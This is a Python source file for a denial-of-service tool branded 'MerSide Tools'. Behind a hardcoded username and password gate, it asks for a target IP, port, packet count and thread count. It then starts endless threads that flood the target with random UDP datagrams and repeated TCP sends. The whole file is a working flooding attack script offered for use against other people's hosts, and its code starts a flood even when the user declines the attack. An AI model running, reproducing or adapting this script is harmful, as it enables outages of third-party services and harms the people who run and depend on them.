# username="MerSide-012"
# password="MerIsG0D"

username="1"
password="2"

import itertools
import random
import socket
import threading
import os,sys
import time
import getpass

doneusertrue = False
def animasiusernametrue():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if doneusertrue:
            break
        sys.stdout.write('\r\033[31m[>]\033[0m Looking for your username ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r\033[31m[>]\033[0m The username you entered is correct!\n')
    time.sleep(2)
    sys.stdout.write('')

tusernametrue = threading.Thread(target=animasiusernametrue)

doneuserfalse = False
def animasiusernamefalse():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if doneuserfalse:
            break
        sys.stdout.write('\r\033[31m[>]\033[0m Looking for your username ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r\033[31m[>]\033[0m The username you entered was not found, please try again!\n')

tusernamefalse = threading.Thread(target=animasiusernamefalse)

donepasstrue = False
def animasipasswordtrue():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if donepasstrue:
            break
        sys.stdout.write('\r\033[31m[>]\033[0m Looking for your password ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r\033[31m[>]\033[0m The password you entered is correct, successful login!')

tpasswordtrue = threading.Thread(target=animasipasswordtrue)

donepassfalse = False
def animasipasswordfalse():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if donepassfalse:
            break
        sys.stdout.write('\r\033[31m[>]\033[0m Looking for your password ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r\033[31m[>]\033[0m The password you entered is wrong!, please try again\n')

tpasswordfalse = threading.Thread(target=animasipasswordfalse)


os.system("cls")

for i in range(3):
    time.sleep(1)
    inptuser = input("\033[31m[>]\033[0m Input Username: \033[91m")

    if(inptuser == username):
        time.sleep(0.25)
        tusernametrue.start()
        time.sleep(5)
        doneusertrue = True
        break
    else:
        time.sleep(0.25)
        tusernamefalse.start()
        time.sleep(5)
        doneuserfalse = True       
        continue
time.sleep(3)

for i in range(3):
    time.sleep(1)
    inptpass = getpass.getpass("\033[31m[>]\033[0m Input Password: \033[91m")

    if(inptpass == password):
        time.sleep(0.25)
        tpasswordtrue.start()
        time.sleep(5)
        donepasstrue = True     
        break
    else:
        time.sleep(0.25)
        tpasswordfalse.start()
        time.sleep(5)
        donepassfalse = True       
        continue
time.sleep(1)

os.system("cls")

print("\033[31m")
print("""
███╗   ███╗███████╗██████╗ ███████╗██╗██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
████╗ ████║██╔════╝██╔══██╗██╔════╝██║██╔══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██╔████╔██║█████╗  ██████╔╝███████╗██║██║  ██║█████╗         ██║   ██║   ██║██║   ██║██║     ███████╗
██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║██║██║  ██║██╔══╝         ██║   ██║   ██║██║   ██║██║     ╚════██║
██║ ╚═╝ ██║███████╗██║  ██║███████║██║██████╔╝███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                Author : Yuda
""")
print("\033[0m")

inptip = str(input("\033[31m[>]\033[0m Input IP Target: \033[91m"))
inptport = int(input("\033[31m[>]\033[0m Input Port Target: \033[91m"))
inpttimes = int(input("\033[31m[>]\033[0m Input Packets: \033[91m"))
inptthreads = int(input("\033[31m[>]\033[0m Input Threads: \033[91m"))
inptchoice = str(input("\033[31m[>]\033[0m DO YOU REALLY WANT TO ATTACK HIM? (Y)es/(N)o: \033[91m"))
time.sleep(1)

donelocked = False
def animasilocked():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if donelocked:
            break
        sys.stdout.write('\r\033[31m[>]\033[0m TRYING TO LOCK THE TARGET WITH IP \033[91m%s\033[0m AND PORT \033[91m%s\033[0m '%(inptip, inptport) + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r\033[31m[>]\033[0m TARGET SUCCESSFULLY LOCKED, WAITING FOR DDOS PROCESS       ')

tlocked = threading.Thread(target=animasilocked)

tlocked.start()
time.sleep(5)
donelocked = True
print("\033[31m[!!]\033[0m DDOS STARTING")

os.system("cls")

def run():
        data = random._urandom(1800)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(inptip),int(inptport))
                        for x in range(inpttimes):
                                s.sendto(data,addr)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run ]\033[0m")

def run2():
        data = random._urandom(1024)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 2 ]\033[0m")

def run3():
        data = random._urandom(16)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 3 ]\033[0m")


def run4():
        data = random._urandom(16)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 4 ]\033[0m")

for y in range(inptthreads):
        if inptchoice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
